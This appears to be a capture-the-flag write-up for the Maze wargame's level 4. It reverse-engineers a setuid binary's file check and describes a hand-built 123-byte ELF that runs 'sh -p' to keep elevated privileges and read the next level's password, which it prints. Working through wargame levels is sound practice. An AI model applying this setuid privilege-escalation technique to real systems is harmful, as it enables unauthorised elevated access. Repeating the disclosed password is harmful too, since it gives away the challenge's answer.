# Maze L4 — solved (2026-11-23)

## The program (live binary, md5 a430203e2d1d77addc79387272e499b4)

`/maze/maze4`, mode 4750, setuid **maze5**, group maze4, 16392 bytes,
ELF 32-bit i386 with debug_info, not stripped. main (0x8049216, 366
bytes), reconstructed from objdump + gdb + strace:

```c
int main(int argc, char **argv) {
    char bufA[52];          /* ebp-0x38: read1 target  */
    char bufB[32];          /* ebp-0xb0: read2 target  */
    struct stat st;         /* ebp-0xb0?? NO — ebp-0x90 (see below) */
    if (argc != 2) { printf("usage: %s file2check\n", argv[0]); exit(-1); }
    int fd = open(argv[1], O_RDONLY);            /* ebp-0xb4 */
    if (fd < 0) { perror("open"); exit(-1); }
    if (stat(argv[1], &st) < 0) { perror("stat"); exit(-1); }   /* st at ebp-0x90 */
    read(fd, bufA, 52);
    lseek(fd, *(int *)(bufA + 28), SEEK_SET);    /* NOT st_size! ebp-0x1c == bufA+28 */
    read(fd, bufB, 32);
    if (*(int *)(bufB + 12) == (unsigned char)bufA[7] * (unsigned char)bufA[8]
        && st.st_size <= 0x7b) {
        puts("valid file, executing");
        execv(argv[1], argv);
    }
    fwrite("file not executed\n", 1, 18, stderr);
    close(fd);
}
```

Line-table (DWARF, `objdump --dwarf=decodedline`): maze4.c lines
26/33/38/43/48/51/52/55/56/58/59/61/63/65/67 — the whole logic is one
main, line 55 = the product compare, 56 = the size check.

## The gate, byte-exact (gdb-verified addresses, ebp = 0xffffdbc8)

| disasm operand | address | meaning |
|---|---|---|
| `[ebp-0x31]` | bufA+7  | factor 1 = **file byte 7** |
| `[ebp-0x30]` | bufA+8  | factor 2 = **file byte 8** |
| `[ebp-0xa4]` | bufB+12 | compare dword (second-read window) |
| `[ebp-0x1c]` | bufA+28 | **lseek offset = dword at file bytes 28..31** (NOT st_size) |
| `[ebp-0x64]` | st+44   | st_size (checked `<= 123`) |

Two traps that cost the first hours:
1. **ebp-relative arithmetic was repeatedly miscounted** (bufA+7 vs
   bufA+15 vs bufA+23). Fixed by dumping `[ebp-0x31]` in the SAME gdb
   session as the compare and diffing against a known file (payW =
   "#!/bin/sh..." → factors 0x73*0x68 = 11960 = s*h).
2. **[ebp-0x1c] is not st_size** — it is read1buf+28, i.e. the lseek
   offset comes from the FILE's own bytes 28..31. For files < 32 bytes
   it reads stale stack garbage (payX llseek'd to 1634754405 = 0x61747461).

So the real gate: `dword(file[off+12..off+15]) == file[7]*file[8]` where
`off = dword(file[28..31])`, plus `size <= 123`.

## The `#!/bin/sh` script attempt (and the /tmp nosuid trap)

A script CAN pass the gate: put the magic dword + the lseek-offset
dword INSIDE the line-2 shell comment (`tools/maze/l4/mkpay.py`,
71 bytes, offset 4, magic at 16..19). It executes — but `/tmp` is a
**tmpfs mounted `nosuid`**, so the setuid bit never applied and dash
ran with euid = maze4. Same for `/run/lock`. `/run/screen` IS on the
root ext4 fs (no nosuid) — but even there the exec'd script ran as
euid 15004: strace showed maze4 makes **no setuid syscall** — the
elevation comes only from the setuid bit on /maze/maze4 itself, which
/tmp strips. Moving the workspace to /run/screen/l4 fixed the *mount*
issue but the script still ran as maze4... because the ssh session's
`/maze/maze4` run DID have euid 15005, and execv of the script keeps
euid — but dash (no -p) drops euid back to ruid for its children.
`id` inside the script printed uid=15004 euid=15004.

## The winning payload: a 123-byte hand-built ELF (`tinel.py`)

A compiled ELF passes the gate for free: file[7]*file[8] =
EI_OSABI*EI_ABIVERSION = 0*0 = **0**, e_phoff = 52 = the lseek offset,
and phdr0+12 = p_paddr — set **p_paddr = 0** (ignored by the kernel)
so the compare is 0 == 0.

Budget: 52 (ehdr) + 32 (phdr) + code ≤ 123. Strings `sh\0-p\0` hide
in e_ident[9..14] (EI_PAD). The 26-byte payload at file offset 84
(vaddr 0x08048000+84) does:

```
execve("sh", {"sh", "-p", NULL}, NULL)
```

`sh` = a copy of dash in the cwd (relative path); **-p keeps the
elevated euid**. Then `cat /etc/maze_pass/maze5` from that shell.

## Result

```
$ cp /bin/sh ./sh
$ python3 tinel.py tiny && chmod 755 tiny sh
$ echo "cat /etc/maze_pass/maze5" | /maze/maze4 tiny
A3846ZPJuH
```

Password `A3846ZPJuH` verified by ssh login as maze5
(uid=15005(maze5), cat matches).

## Files

- `maze4` — the live binary copy (md5 above).
- `mkpay.py` — the script-shaped gate-passing payload (educational;
  blocked by the /tmp nosuid mount + dash euid drop).
- `tinel.py` — the 123-byte hand-built ELF (the working exploit).
- `NOTES.md` — this file.
